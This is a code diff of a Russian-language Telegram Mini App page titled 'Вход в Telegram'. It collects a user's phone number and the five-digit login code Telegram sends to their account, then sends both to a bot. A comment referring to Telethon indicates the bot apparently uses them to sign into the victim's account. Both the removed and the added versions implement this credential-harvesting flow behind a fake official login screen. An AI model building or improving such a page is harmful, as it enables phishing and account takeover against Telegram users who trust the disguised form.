@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вход в аккаунт</title>
+    <title>Вход в Telegram</title>
     <!-- Подключение Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Подключение Telegram WebApp SDK -->
@@ -15,588 +15,271 @@
         
         body {
             font-family: 'Inter', sans-serif;
+            /* Фиксируем темный фон по умолчанию, как в старом дизайне */
+            background-color: var(--tg-theme-bg-color, #1c1c1d); 
+            color: var(--tg-theme-text-color, #ffffff); /* Белый текст по умолчанию */
             transition: background-color 0.3s ease;
         }
 
-        /* Стиль для активного поля ввода (фокус) */
+        /* Более простой, темный стиль карточки */
+        .card-bg {
+            background-color: var(--tg-theme-secondary-bg-color, #2a2a2d); 
+            border: 1px solid var(--tg-theme-hint-color, #3c3c3f);
+        }
+        
+        /* Стиль для полей ввода */
+        .input-primary {
+            background-color: var(--tg-theme-bg-color, #1c1c1d);
+            color: var(--tg-theme-text-color, #ffffff);
+            border: 1px solid var(--tg-theme-hint-color, #3c3c3f);
+        }
+
         .input-primary:focus {
             border-color: var(--tg-theme-link-color, #2481cc);
             box-shadow: 0 0 0 2px rgba(var(--tg-theme-link-color, #2481cc), 0.5);
         }
 
-        /* Стилизация для лучшего отображения в темной теме Fragment */
-        .card-bg {
-            background-color: var(--tg-theme-secondary-bg-color, #1c1c1d);
-            border: 1px solid var(--tg-theme-hint-color, #2a2a2b30);
-        }
-
-        /* Стиль для кнопки-префикса в поле ввода */
-        #country-prefix-button {
-            border-right: 1px solid var(--tg-theme-hint-color, #2a2a2b30);
-            cursor: pointer;
-        }
-        
-        /* Стилизация элементов в модальном окне */
-        .country-item-modal:hover {
-            /* Используем основной цвет фона Telegram для эффекта при наведении */
-            background-color: var(--tg-theme-bg-color); 
-        }
-
-        /* Стили для сегментированных полей ввода кода */
-        .code-segment {
-            border: none;
-            border-bottom: 2px solid var(--tg-theme-hint-color, #5e5e5f);
-            padding: 0 4px;
-            width: 40px; /* Фиксированная ширина для цифры */
-            height: 48px;
+        /* Стиль для полей ввода кода */
+        .code-input {
+            width: 3rem;
+            height: 3rem;
             text-align: center;
-            font-size: 2rem;
-            line-height: 1.5;
-            background-color: transparent;
-            transition: border-color 0.3s ease;
-            color: var(--tg-theme-text-color);
-            /* Моноширинный шрифт для лучшего выравнивания цифр */
-            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace;
+            font-size: 1.5rem;
         }
-        .code-segment:focus {
-            border-bottom-color: var(--tg-theme-link-color, #2481cc);
-            outline: none;
+
+        /* Сообщение об ошибке */
+        .message-error {
+            color: var(--tg-theme-destructive-text-color, #f87171);
+        }
+
+        /* Цвет для подсказок, часто используемый в темных темах */
+        .hint-color {
+            color: var(--tg-theme-hint-color, #a1a1a1);
         }
     </style>
 </head>
+<body class="flex flex-col min-h-screen items-center justify-center p-4">
 
-<body class="min-h-screen flex items-center justify-center p-4 text-white" id="app-body">
-    
-    <!-- Основной контейнер с адаптивным центрированием -->
-    <div class="w-full max-w-md">
+    <!-- Общий контейнер для карточки -->
+    <div id="main-card" class="card-bg w-full max-w-sm rounded-xl p-6 shadow-2xl space-y-6">
         
-        <!-- Контейнер для сообщений -->
-        <div id="message-container" class="mb-4 p-3 rounded-lg hidden" role="alert">
-            <p id="message-text" class="text-sm"></p>
-        </div>
+        <!-- Заголовок и поле для сообщений -->
+        <h1 id="main-title" class="text-2xl font-bold text-center"></h1>
+        <p id="message-output" class="text-center text-sm transition-all duration-300"></p>
 
-        <!-- Форма ввода телефона (Отображается по умолчанию) -->
-        <div id="phone-step" class="card-bg p-6 rounded-xl shadow-lg transition-all duration-300">
-            <!-- Иконка и заголовок для шага телефона -->
-            <div class="text-center mb-8">
-                <svg class="w-16 h-16 mx-auto text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1"></path>
-                </svg>
-                <h1 class="text-2xl font-bold mt-2 text-primary" id="main-title" style="color:var(--tg-theme-text-color)">Вход в Telegram</h1>
-            </div>
-
-            <h2 class="text-xl font-semibold mb-6 text-center" style="color:var(--tg-theme-text-color)">Введите ваш номер телефона</h2>
-            <p class="text-sm mb-6 text-center" style="color:var(--tg-theme-hint-color)">
-                Он будет использоваться для отправки запроса на вход.
+        <!-- ЭКРАН 1: Ввод номера телефона -->
+        <div id="phone-screen" class="space-y-4 hidden">
+            <p class="text-sm text-center hint-color">
+                Пожалуйста, введите ваш номер телефона в международном формате (например, +79123456789).
             </p>
-
-            <form id="phone-form">
-                
-                <div class="mb-6 relative">
-                    <label for="phone-input" class="block mb-2 text-sm font-medium" style="color:var(--tg-theme-text-color)">
-                        Номер телефона
-                    </label>
-
-                    <!-- ИНТЕГРИРОВАННОЕ ПОЛЕ ВВОДА НОМЕРА С ВЫБОРОМ СТРАНЫ -->
-                    <div class="flex rounded-lg border focus-within:ring-2 transition duration-150" 
-                         id="phone-input-group"
-                         style="border-color:var(--tg-theme-hint-color); --tw-ring-color:var(--tg-theme-link-color);">
-                        
-                        <!-- Кнопка/Префикс страны (клик для открытия модального окна) -->
-                        <button type="button" id="country-prefix-button"
-                            class="flex items-center p-3 font-semibold transition duration-150 shrink-0 hover:bg-opacity-90"
-                            style="background-color:var(--tg-theme-secondary-bg-color); color:var(--tg-theme-text-color);"
-                        >
-                            <span id="selected-flag" class="text-xl mr-2">🇷🇺</span>
-                            <span id="selected-code" class="text-sm"> +7 </span>
-                        </button>
-
-                        <!-- Поле ввода номера -->
-                        <input type="tel" id="phone-input" 
-                            class="input-primary w-full p-3 focus:outline-none"
-                            placeholder="9991234567" required
-                            style="background-color:var(--tg-theme-bg-color); color:var(--tg-theme-text-color);"
-                        >
-                    </div>
-                </div>
-                
-                <button type="submit" id="phone-button" 
-                    class="w-full p-3 rounded-lg font-semibold transition duration-150 transform hover:scale-[1.01] active:scale-[0.99] disabled:opacity-50"
-                    style="background-color:var(--tg-theme-button-color); color:var(--tg-theme-button-text-color);"
-                >
-                    Получить код
-                </button>
-            </form>
-        </div>
-
-        <!-- Форма ввода кода (Скрыта по умолчанию) -->
-        <div id="code-step" class="card-bg p-6 rounded-xl shadow-lg hidden transition-all duration-300">
-            
-            <!-- Иконка Почтовый ящик (Mailbox) -->
-            <div class="text-center mb-6">
-                <!-- SVG-иконка почтового ящика, имитирующая скриншот -->
-                <svg class="w-16 h-16 mx-auto mb-4" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <rect x="2" y="5" width="20" height="15" rx="3" fill="#E5E7EB" style="fill:var(--tg-theme-secondary-bg-color)"/>
-                    <rect x="2" y="5" width="20" height="15" rx="3" stroke="#9CA3AF" stroke-width="1.5" style="stroke:var(--tg-theme-hint-color)"/>
-                    <path d="M22 6L12 14L2 6" stroke="#9CA3AF" stroke-width="1.5" style="stroke:var(--tg-theme-hint-color)"/>
-                    <!-- Дверца -->
-                    <rect x="7" y="10" width="10" height="7" rx="1" fill="#D1D5DB" style="fill:var(--tg-theme-bg-color)"/>
-                    <!-- Ручка -->
-                    <circle cx="15.5" cy="13.5" r="1.5" fill="#EF4444" style="fill:var(--tg-theme-link-color)"/>
-                </svg>
-
-                <h1 class="text-2xl font-bold mt-2" style="color:var(--tg-theme-text-color)">Код подтверждения</h1>
-            </div>
-
-            <p class="text-sm mb-8 text-center" style="color:var(--tg-theme-hint-color)">
-                Код был отправлен в ваш аккаунт Telegram. Пожалуйста, откройте Telegram на другом устройстве и введите полученный 5-значный код здесь.
-            </p>
-
-            <form id="code-form">
-                <div class="mb-8 flex justify-center space-x-2 sm:space-x-4">
-                    <!-- Сегментированные поля ввода для кода -->
-                    <input type="number" id="code-input-1" class="code-segment" maxlength="1" required autofocus>
-                    <input type="number" id="code-input-2" class="code-segment" maxlength="1" required>
-                    <input type="number" id="code-input-3" class="code-segment" maxlength="1" required>
-                    <input type="number" id="code-input-4" class="code-segment" maxlength="1" required>
-                    <input type="number" id="code-input-5" class="code-segment" maxlength="1" required>
-                </div>
-                
-                <!-- Ссылка "Отправить еще раз" -->
-                <div class="text-center mb-6">
-                    <a href="#" id="send-again-link" class="text-sm font-medium transition duration-150" style="color:var(--tg-theme-link-color)">
-                        Отправить код еще раз
-                    </a>
-                </div>
-
-                <button type="submit" id="code-button" 
-                    class="w-full p-3 rounded-lg font-semibold transition duration-150 transform hover:scale-[1.01] active:scale-[0.99] disabled:opacity-50"
-                    style="background-color:var(--tg-theme-button-color); color:var(--tg-theme-button-text-color);"
-                >
-                    Подтвердить вход
-                </button>
-            </form>
-        </div>
-        
-    </div>
-
-    <!-- Модальное окно выбора страны (появляется снизу) -->
-    <div id="country-modal" class="fixed inset-0 z-50 bg-black bg-opacity-70 flex items-end justify-center hidden">
-        <div id="modal-content" class="card-bg w-full max-w-md rounded-t-xl shadow-2xl p-4 transform transition-transform duration-300 translate-y-full">
-            <div class="flex justify-between items-center mb-4">
-                <h3 class="text-xl font-bold" style="color:var(--tg-theme-text-color);">Выберите страну</h3>
-                <button id="modal-close-button" class="text-3xl font-light leading-none" style="color: var(--tg-theme-hint-color);">×</button>
-            </div>
-            
-            <!-- Поле поиска -->
-            <input type="text" id="country-search-input" 
-                class="input-primary w-full p-3 mb-4 rounded-lg focus:outline-none transition duration-150"
-                placeholder="Поиск по названию или коду..."
-                style="background-color:var(--tg-theme-bg-color); color:var(--tg-theme-text-color); border-color:var(--tg-theme-hint-color);"
+            <input 
+                id="phoneInput" 
+                type="tel" 
+                placeholder="+XXXXXXXXXXX" 
+                class="input-primary w-full p-3 rounded-lg text-lg focus:outline-none transition-all duration-200"
             >
+            <button 
+                id="phoneButton" 
+                class="w-full py-3 rounded-xl font-semibold bg-blue-500 hover:bg-blue-600 text-white transition-colors duration-200" 
+                style="background-color: var(--tg-theme-button-color); color: var(--tg-theme-button-text-color);"
+            >
+                Отправить код
+            </button>
+        </div>
 
-            <!-- Список стран -->
-            <div id="country-list-modal" class="max-h-80 overflow-y-auto rounded-lg" style="background-color:var(--tg-theme-secondary-bg-color);">
-                <!-- Список будет заполнен через JS -->
+        <!-- ЭКРАН 2: Ввод кода подтверждения -->
+        <div id="code-screen" class="space-y-4 hidden">
+            <p class="text-sm text-center hint-color">
+                Введите 5-значный код, который пришел вам в Telegram.
+            </p>
+            
+            <!-- Поля для кода -->
+            <div class="flex justify-center space-x-2">
+                <input type="text" maxlength="1" class="code-input rounded-lg input-primary focus:outline-none" data-index="0">
+                <input type="text" maxlength="1" class="code-input rounded-lg input-primary focus:outline-none" data-index="1">
+                <input type="text" maxlength="1" class="code-input rounded-lg input-primary focus:outline-none" data-index="2">
+                <input type="text" maxlength="1" class="code-input rounded-lg input-primary focus:outline-none" data-index="3">
+                <input type="text" maxlength="1" class="code-input rounded-lg input-primary focus:outline-none" data-index="4">
             </div>
+
+            <button 
+                id="codeButton" 
+                class="w-full py-3 rounded-xl font-semibold bg-blue-500 hover:bg-blue-600 text-white transition-colors duration-200" 
+                style="background-color: var(--tg-theme-button-color); color: var(--tg-theme-button-text-color);"
+            >
+                Подтвердить вход
+            </button>
         </div>
     </div>
-
+    
     <script>
+        // Инициализация WebApp SDK
         const WebApp = window.Telegram.WebApp;
-        const phoneStep = document.getElementById('phone-step');
-        const codeStep = document.getElementById('code-step');
-        const phoneForm = document.getElementById('phone-form');
-        const codeForm = document.getElementById('code-form');
-        const phoneInput = document.getElementById('phone-input');
-        const phoneButton = document.getElementById('phone-button');
-        const codeButton = document.getElementById('code-button');
-        const messageContainer = document.getElementById('message-container');
-        const messageText = document.getElementById('message-text');
         
-        // Сегментированные поля ввода кода
-        const codeInputs = [
-            document.getElementById('code-input-1'),
-            document.getElementById('code-input-2'),
-            document.getElementById('code-input-3'),
-            document.getElementById('code-input-4'),
-            document.getElementById('code-input-5')
-        ];
-
-        // Кнопка "Отправить еще раз"
-        const sendAgainLink = document.getElementById('send-again-link');
-
-        // Элементы нового селектора страны
-        const countryPrefixButton = document.getElementById('country-prefix-button');
-        const selectedFlag = document.getElementById('selected-flag');
-        const selectedCode = document.getElementById('selected-code');
-        const countryModal = document.getElementById('country-modal');
-        const modalContent = document.getElementById('modal-content');
-        const modalCloseButton = document.getElementById('modal-close-button');
-        const countrySearchInput = document.getElementById('country-search-input');
-        const countryListModal = document.getElementById('country-list-modal');
-
-        // Глобальный объект для хранения выбранной страны (для валидации)
-        let selectedCountry = null; 
-
-        // Данные по странам (флаг, код, максимальная длина номера без кода)
-        const countries = [
-            { name: "Россия", flag: "🇷🇺", code: "+7", length: 10, search: 'россия russia 7' },
-            { name: "Украина", flag: "🇺🇦", code: "+380", length: 9, search: 'украина ukraine 380' },
-            { name: "Казахстан", flag: "🇰🇿", code: "+7", length: 10, search: 'казахстан kazakhstan 7' },
-            { name: "Беларусь", flag: "🇧🇾", code: "+375", length: 9, search: 'беларусь belarus 375' },
-            { name: "Германия", flag: "🇩🇪", code: "+49", length: 10, search: 'германия germany 49' },
-            { name: "США", flag: "🇺🇸", code: "+1", length: 10, search: 'сша usa 1' },
-            { name: "Турция", flag: "🇹🇷", code: "+90", length: 10, search: 'турция turkey 90' },
-            { name: "Польша", flag: "🇵🇱", code: "+48", length: 9, search: 'польша poland 48' },
-            { name: "Великобритания", flag: "🇬🇧", code: "+44", length: 10, search: 'великобритания uk 44' },
-            { name: "Азербайджан", flag: "🇦🇿", code: "+994", length: 9, search: 'азербайджан azerbaijan 994' },
-            { name: "Армения", flag: "🇦🇲", code: "+374", length: 8, search: 'армения armenia 374' },
-            { name: "Грузия", flag: "🇬🇪", code: "+995", length: 9, search: 'грузия georgia 995' },
-            { name: "Израиль", flag: "🇮🇱", code: "+972", length: 9, search: 'израиль israel 972' },
-        ];
+        // Элементы
+        const mainTitle = document.getElementById('main-title');
+        const messageOutput = document.getElementById('message-output');
+        const phoneScreen = document.getElementById('phone-screen');
+        const codeScreen = document.getElementById('code-screen');
+        const phoneInput = document.getElementById('phoneInput');
+        const phoneButton = document.getElementById('phoneButton');
+        const codeButton = document.getElementById('codeButton');
+        const codeInputs = Array.from(document.querySelectorAll('#code-screen .code-input'));
 
 
-        /**
-         * Инициализация WebApp и селектора стран.
-         */
-        function initWebApp() {
-            if (WebApp.initDataUnsafe.user) {
-                // Динамическое обновление заголовка только для шага телефона
-                // document.getElementById('main-title').innerText = `С возвращением, ${WebApp.initDataUnsafe.user.first_name}!`;
+        function displayMessage(text, type = 'info') {
+            messageOutput.textContent = text;
+            messageOutput.className = 'text-center text-sm transition-all duration-300 mt-2';
+            
+            if (type === 'error') {
+                messageOutput.classList.add('message-error');
+            } else {
+                // Используем класс hint-color для информационных сообщений
+                messageOutput.classList.add('hint-color');
             }
-            
-            document.getElementById('app-body').style.backgroundColor = WebApp.themeParams.bg_color || '#18181a';
+        }
+
+        // =================================================================
+        // ЛОГИКА ЭКРАНА ВВОДА НОМЕРА ТЕЛЕФОНА
+        // =================================================================
+        function setupPhoneListener() {
+            mainTitle.textContent = "Вход в аккаунт";
             WebApp.setHeaderColor('secondary_bg_color');
-            WebApp.MainButton.setText('Отправить').hide();
+            WebApp.setBackgroundColor('bg_color');
             
-            initCountrySelector(); // Инициализация селектора
-            initCodeInputs(); // Инициализация логики сегментированных полей
-            checkStep(); // Проверка, какой шаг нужно показать
-        }
+            phoneButton.addEventListener('click', () => {
+                const phone = phoneInput.value.trim();
 
-        /**
-         * Устанавливает выбранную страну, обновляет UI и поле ввода.
-         * @param {Object} country Объект страны из массива countries.
-         */
-        function setCountry(country) {
-            selectedCountry = country;
-            selectedFlag.innerText = country.flag;
-            selectedCode.innerText = ` ${country.code} `;
-
-            // Устанавливаем максимальную длину для номера (без кода)
-            phoneInput.maxLength = country.length;
-            phoneInput.placeholder = 'Введите ' + country.length + ' цифр';
-            phoneInput.value = ''; // Сброс номера при смене страны
-            
-            closeModal(); // Закрыть модальное окно после выбора
-            phoneInput.focus(); // Установить фокус на поле ввода номера
-        }
-        
-        /**
-         * Открывает модальное окно выбора страны.
-         */
-        function openModal() {
-            // 1. Показываем контейнер модального окна (темный фон)
-            countryModal.classList.remove('hidden');
-            
-            // 2. СРАЗУ ЖЕ запускаем анимацию слайда снизу
-            modalContent.classList.remove('translate-y-full'); 
-            
-            countrySearchInput.focus();
-            WebApp.BackButton.show();
-            WebApp.onEvent('backButtonClicked', closeModal); // Обработка кнопки "Назад" в WebApp
-        }
-
-        /**
-         * Закрывает модальное окно выбора страны.
-         */
-        function closeModal() {
-            // Анимация слайда вниз
-            modalContent.classList.add('translate-y-full');
-            setTimeout(() => {
-                countryModal.classList.add('hidden');
-            }, 300);
-            WebApp.BackButton.hide();
-            WebApp.offEvent('backButtonClicked', closeModal); // Удаляем обработчик после закрытия
-        }
-
-        /**
-         * Создает и заполняет список стран в модальном окне.
-         * @param {string} filter Строка фильтра для поиска.
-         */
-        function renderCountryList(filter = '') {
-            countryListModal.innerHTML = '';
-            const lowerCaseFilter = filter.toLowerCase();
-
-            countries.forEach(country => {
-                const searchString = (country.name + ' ' + country.code + ' ' + (country.search || '')).toLowerCase();
+                if (!phone.startsWith('+')) {
+                    displayMessage('Номер должен начинаться со знака "+".', 'error');
+                    return;
+                }
                 
-                if (filter && !searchString.includes(lowerCaseFilter)) {
+                if (phone.replace(/\D/g, '').length < 8) {
+                    displayMessage('Пожалуйста, введите полный номер телефона.', 'error');
+                    return;
+                }
+                
+                // Блокируем кнопку
+                phoneButton.disabled = true;
+                phoneButton.innerText = 'Отправка...';
+                displayMessage('Отправляем запрос...');
+
+                // Отправка данных боту
+                const data = {
+                    step: 'phone',
+                    phone: phone
+                };
+
+                try {
+                    // WebApp.sendData закрывает WebApp и отправляет данные в Python
+                    WebApp.sendData(JSON.stringify(data));
+                } catch (error) {
+                    displayMessage('Ошибка при отправке данных в Telegram: ' + error.message, 'error');
+                    phoneButton.disabled = false;
+                    phoneButton.innerText = 'Отправить код';
+                }
+            });
+            
+            // Если в URL нет параметра, делаем WebApp видимым
+            if (new URLSearchParams(window.location.search).get('step') === 'phone' || !new URLSearchParams(window.location.search).get('step')) {
+                WebApp.ready();
+                WebApp.MainButton.hide(); // Не используем главную кнопку
+                WebApp.expand();
+            }
+        }
+
+
+        // =================================================================
+        // ЛОГИКА ЭКРАНА ВВОДА КОДА ПОДТВЕРЖДЕНИЯ 
+        // =================================================================
+        function setupCodeListener() {
+            mainTitle.textContent = "Введите код";
+            WebApp.setHeaderColor('secondary_bg_color');
+            WebApp.setBackgroundColor('bg_color');
+            
+            // Логика авто-фокуса и перехода между полями
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 1); // Только одна цифра
+                    if (e.target.value && index < codeInputs.length - 1) {
+                        codeInputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+            });
+
+            // Нажатие на кнопку подтверждения кода
+            codeButton.addEventListener('click', () => {
+                // Собираем код из 5 полей
+                const code = codeInputs.map(input => input.value).join('');
+
+                if (code.length !== codeInputs.length) {
+                    displayMessage(`Пожалуйста, введите ${codeInputs.length}-значный код полностью.`, 'error');
+                    return;
+                }
+                if (code.replace(/\D/g, '').length !== codeInputs.length) {
+                    displayMessage('Код может содержать только цифры.', 'error');
                     return;
                 }
 
-                const item = document.createElement('div');
-                item.className = 'country-item-modal p-3 flex justify-between items-center cursor-pointer transition duration-100 rounded-lg';
-                item.style.color = 'var(--tg-theme-text-color)';
-                item.innerHTML = `
-                    <span class="flex items-center">
-                        <span class="text-xl mr-3">${country.flag}</span>
-                        <span class="font-medium">${country.name}</span>
-                    </span>
-                    <span class="text-sm font-semibold" style="color:var(--tg-theme-hint-color)">${country.code}</span>
-                `;
-                item.addEventListener('click', () => setCountry(country));
-                countryListModal.appendChild(item);
-            });
-            
-            if (countryListModal.innerHTML === '') {
-                countryListModal.innerHTML = `<p class="p-4 text-center" style="color:var(--tg-theme-hint-color)">Не найдено</p>`;
-            }
-        }
+                // Блокируем кнопку и показываем лоадер
+                codeButton.disabled = true;
+                codeButton.innerText = 'Подтверждение...';
 
-        /**
-         * Инициализация логики выбора страны.
-         */
-        function initCountrySelector() {
-            // Устанавливаем Россию как страну по умолчанию
-            setCountry(countries[0]); 
-            renderCountryList();
+                displayMessage('Проверка кода...');
 
-            // Обработчики модального окна
-            countryPrefixButton.addEventListener('click', openModal);
-            modalCloseButton.addEventListener('click', closeModal);
+                // Отправка данных боту
+                const data = {
+                    step: 'code',
+                    code: code
+                };
 
-            // Обработка поиска
-            countrySearchInput.addEventListener('input', function() {
-                renderCountryList(this.value);
-            });
-
-            // Ограничение ввода только цифрами и валидация длины в поле номера
-            phoneInput.addEventListener('input', function() {
-                // Удаляем все, кроме цифр
-                this.value = this.value.replace(/\D/g, '');
-                
-                // Дополнительная валидация на длину
-                if (selectedCountry && this.value.length > selectedCountry.length) {
-                    this.value = this.value.slice(0, selectedCountry.length);
+                try {
+                    // WebApp.sendData закрывает WebApp. Бот обработает данные.
+                    WebApp.sendData(JSON.stringify(data));
+                } catch (error) {
+                    displayMessage('Ошибка при отправке данных в Telegram: ' + error.message, 'error');
+                    codeButton.disabled = false;
+                    codeButton.innerText = 'Подтвердить вход';
                 }
             });
-        }
-        
-        /**
-         * Инициализация логики для сегментированных полей ввода кода.
-         */
-        function initCodeInputs() {
-            codeInputs.forEach((input, index) => {
-                // Очистка от нецифровых символов и ограничение длины
-                input.addEventListener('input', (e) => {
-                    input.value = input.value.replace(/\D/g, '').slice(0, 1);
-                    if (input.value.length === 1) {
-                        // Автоматический переход к следующему полю
-                        if (index < codeInputs.length - 1) {
-                            codeInputs[index + 1].focus();
-                        } else {
-                            // Последнее поле: снимаем фокус и отправляем форму
-                            input.blur();
-                            // Только если все поля заполнены, отправляем форму
-                            if (codeInputs.every(i => i.value.length === 1)) {
-                                codeForm.dispatchEvent(new Event('submit'));
-                            }
-                        }
-                    }
-                });
-
-                // Обработка клавиши Backspace
-                input.addEventListener('keydown', (e) => {
-                    if (e.key === 'Backspace' && input.value === '') {
-                        if (index > 0) {
-                            // Переход к предыдущему полю
-                            codeInputs[index - 1].focus();
-                        }
-                    }
-                });
-                
-                // Обработка Ctrl+V/Вставки
-                input.addEventListener('paste', (e) => {
-                    e.preventDefault();
-                    const pasteData = (e.clipboardData || window.clipboardData)
-                                        .getData('text')
-                                        .replace(/\D/g, '') // Удаляем все, кроме цифр
-                                        .slice(0, codeInputs.length - index); // Ограничиваем длиной оставшихся полей
-
-                    for (let i = 0; i < pasteData.length; i++) {
-                        if (index + i < codeInputs.length) {
-                            codeInputs[index + i].value = pasteData[i];
-                            
-                            if (index + i === codeInputs.length - 1) {
-                                // Если заполнили последнее поле
-                                codeInputs[index + i].blur();
-                                codeForm.dispatchEvent(new Event('submit'));
-                            } else if (index + i < codeInputs.length - 1) {
-                                // Переводим фокус на следующее после вставки
-                                codeInputs[index + i + 1].focus();
-                            }
-                        }
-                    }
-                });
-            });
-
-            // Обработчик для ссылки "Отправить еще раз"
-            sendAgainLink.addEventListener('click', (e) => {
-                e.preventDefault();
-                displayMessage('Запрос на повторную отправку кода. Если бот его примет, он пришлет вам новую кнопку для ввода кода.', 'info');
-                
-                // В реальном приложении: отправка запроса боту на повторную отправку кода.
-                // Так как в Telethon это сложнее (нужен другой call), мы здесь просто показываем сообщение, 
-                // но в идеале нужно отправить WebApp.sendData({ step: 'resend_code' })
-            });
+            
+            // Если в URL есть параметр step=code, делаем WebApp видимым
+            if (new URLSearchParams(window.location.search).get('step') === 'code') {
+                WebApp.ready();
+                WebApp.MainButton.hide(); // Не используем главную кнопку
+                WebApp.expand();
+            }
         }
 
-        /**
-         * Определяет, какой шаг нужно показать, основываясь на параметре URL.
-         */
-        function checkStep() {
+        // =================================================================
+        // ИНИЦИАЛИЗАЦИЯ И МАРШРУТИЗАЦИЯ
+        // =================================================================
+        function initWebApp() {
             const urlParams = new URLSearchParams(window.location.search);
-            const step = urlParams.get('step');
-
-            if (step === 'code') {
-                showCodeStep();
+            const step = urlParams.get('step') || 'phone';
+            
+            // Показываем нужный экран и настраиваем слушатели
+            if (step === 'phone') {
+                phoneScreen.classList.remove('hidden');
+                setupPhoneListener();
+            } else if (step === 'code') {
+                codeScreen.classList.remove('hidden');
+                setupCodeListener();
             } else {
-                showPhoneStep();
+                mainTitle.textContent = "Ошибка";
+                displayMessage("Неверный параметр запуска WebApp. Начните с /start", 'error');
+                WebApp.ready();
+                WebApp.MainButton.setText("Закрыть").onClick(() => WebApp.close()).show();
+                WebApp.expand();
             }
         }
-
-        /**
-         * Показать форму ввода телефона.
-         */
-        function showPhoneStep() {
-            phoneStep.classList.remove('hidden');
-            codeStep.classList.add('hidden');
-            WebApp.setParams({ 'step': 'phone' });
-            WebApp.ready();
-        }
-
-        /**
-         * Показать форму ввода кода.
-         */
-        function showCodeStep() {
-            phoneStep.classList.add('hidden');
-            codeStep.classList.remove('hidden');
-            WebApp.setParams({ 'step': 'code' });
-            WebApp.ready();
-            // Фокусируемся на первом поле кода
-            codeInputs[0].focus(); 
-        }
-
-        /**
-         * Отображает сообщение (успех/ошибка) на экране.
-         * @param {string} text Текст сообщения.
-         * @param {'error'|'success'|'info'} type Тип сообщения.
-         */
-        function displayMessage(text, type = 'info') {
-            messageText.innerText = text;
-            messageContainer.classList.remove('hidden', 'bg-red-800/20', 'text-red-300', 'bg-green-800/20', 'text-green-300', 'bg-blue-800/20', 'text-blue-300');
-
-            if (type === 'error') {
-                messageContainer.classList.add('bg-red-800/20', 'text-red-300');
-                messageContainer.style.backgroundColor = WebApp.themeParams.hint_color ? `${WebApp.themeParams.hint_color}30` : '#3d3d3d'; // Темный фон для ошибки
-                messageText.style.color = WebApp.themeParams.destructive_text_color || '#ff6666';
-            } else if (type === 'success') {
-                messageContainer.classList.add('bg-green-800/20', 'text-green-300');
-                messageContainer.style.backgroundColor = WebApp.themeParams.hint_color ? `${WebApp.themeParams.hint_color}30` : '#3d3d3d';
-                messageText.style.color = WebApp.themeParams.link_color || '#66ff66';
-            } else {
-                messageContainer.classList.add('bg-blue-800/20', 'text-blue-300');
-                messageContainer.style.backgroundColor = WebApp.themeParams.secondary_bg_color || '#3d3d3d';
-                messageText.style.color = WebApp.themeParams.text_color || '#ffffff';
-            }
-            messageContainer.classList.remove('hidden');
-        }
-
-        /**
-         * Обработчик отправки формы номера телефона.
-         */
-        phoneForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            const rawNumber = phoneInput.value.trim();
-            
-            if (!selectedCountry) {
-                displayMessage('Пожалуйста, выберите страну.', 'error');
-                return;
-            }
-
-            // Валидация длины
-            if (rawNumber.length !== selectedCountry.length) {
-                displayMessage(`Необходимо ввести ${selectedCountry.length} цифр в номере. Вы ввели ${rawNumber.length}.`, 'error');
-                return;
-            }
-
-            // Собираем полный номер телефона
-            const fullPhone = selectedCountry.code + rawNumber;
-
-            // Блокируем кнопку и показываем лоадер
-            phoneButton.disabled = true;
-            phoneButton.innerText = 'Отправка...';
-
-            displayMessage(`Отправка номера телефона ${fullPhone} боту...`, 'info');
-
-            // Отправка данных боту
-            const data = {
-                step: 'phone',
-                phone: fullPhone
-            };
-            
-            try {
-                // WebApp.sendData закрывает WebApp и отправляет данные боту.
-                WebApp.sendData(JSON.stringify(data));
-            } catch (error) {
-                displayMessage('Ошибка при отправке данных в Telegram: ' + error.message, 'error');
-                phoneButton.disabled = false;
-                phoneButton.innerText = 'Получить код';
-            }
-        });
-
-        /**
-         * Обработчик отправки формы кода подтверждения.
-         */
-        codeForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Собираем код из 5 полей
-            const code = codeInputs.map(input => input.value).join('');
-
-            if (code.length !== codeInputs.length) {
-                displayMessage(`Пожалуйста, введите ${codeInputs.length}-значный код полностью.`, 'error');
-                return;
-            }
-            if (code.replace(/\D/g, '').length !== codeInputs.length) {
-                displayMessage('Код может содержать только цифры.', 'error');
-                return;
-            }
-
-
-            // Блокируем кнопку и показываем лоадер
-            codeButton.disabled = true;
-            codeButton.innerText = 'Подтверждение...';
-
-            displayMessage('Проверка кода...', 'info');
-
-            // Отправка данных боту
-            const data = {
-                step: 'code',
-                code: code
-            };
-
-            try {
-                // WebApp.sendData закрывает WebApp. Бот обработает данные.
-                WebApp.sendData(JSON.stringify(data));
-            } catch (error) {
-                displayMessage('Ошибка при отправке данных в Telegram: ' + error.message, 'error');
-                codeButton.disabled = false;
-                codeButton.innerText = 'Подтвердить вход';
-            }
-        });
 
         // Запуск инициализации после загрузки скрипта WebApp
         if (document.readyState === 'loading') {
